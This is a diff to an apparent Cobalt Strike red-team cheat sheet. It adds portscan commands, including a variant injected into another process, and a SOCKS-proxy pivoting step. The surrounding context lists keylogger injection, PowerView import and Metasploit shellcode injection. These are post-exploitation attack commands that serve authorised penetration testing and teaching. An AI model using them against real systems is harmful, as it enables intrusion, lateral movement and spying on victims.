@@ -49,6 +49,10 @@ screenwatch    # Take periodic screenshots of desktop
 keylogger [pid] [x86|x64]
 ## View > Keystrokes to see the keys pressed
 
+# portscan
+portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
+portscan [targets] [ports] [arp|icmp|none] [max connections]
+
 # Powershell
 # Import Powershell module
 powershell-import C:\path\to\PowerView.ps1
@@ -158,4 +162,10 @@ shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x6
 
 # Pass metasploit session to cobalt strike
 ## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
-## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode</code></pre>
+## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode
+
+
+# Pivoting
+## Open a socks proxy in the teamserver
+beacon> socks 1080
+</code></pre>
